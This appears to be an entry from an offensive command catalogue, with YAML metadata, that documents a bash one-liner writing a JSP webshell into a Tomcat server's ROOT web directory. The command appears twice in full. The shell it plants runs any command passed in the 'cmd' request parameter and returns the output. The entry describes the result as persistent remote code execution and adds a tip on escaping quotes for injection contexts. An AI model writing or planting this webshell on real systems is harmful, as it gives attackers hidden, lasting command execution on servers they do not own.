---
id: cmd-echo-webshell-3
data: >-
  | echo '<% if (request.getParameter(\"cmd\") != null) { Process p =
  Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream
  in = p.getInputStream(); int a = -1; while ((a = in.read()) != -1)
  out.print((char)a); } %>' > /etc/tomcat/webapps/ROOT/shell.jsp
tags:
  - webshell
  - persistence
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:26.973Z'
verified: false
validated: true
submitted: true
---
# echo-jsp-webshell

## Command

```bash
echo '<% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream in = p.getInputStream(); int a = -1; while ((a = in.read()) != -1) out.print((char)a); } %>' > /etc/tomcat/webapps/ROOT/shell.jsp
```

## Description

Writes a JSP webshell to the Tomcat ROOT application directory, enabling parameter-driven command execution for persistent RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file | Target path (/etc/tomcat/webapps/ROOT/shell.jsp) | Yes |
| content | JSP code snippet for Runtime.exec | Yes |

## Examples

### Basic Usage

```bash
echo 'JSP_CODE' > /path/to/shell.jsp
```

### Advanced Usage

Escape quotes for injection contexts.

## Expected Output

File created successfully; subsequent access via ?cmd= returns command output.

## Related

- [[commands/id-check-privs]]
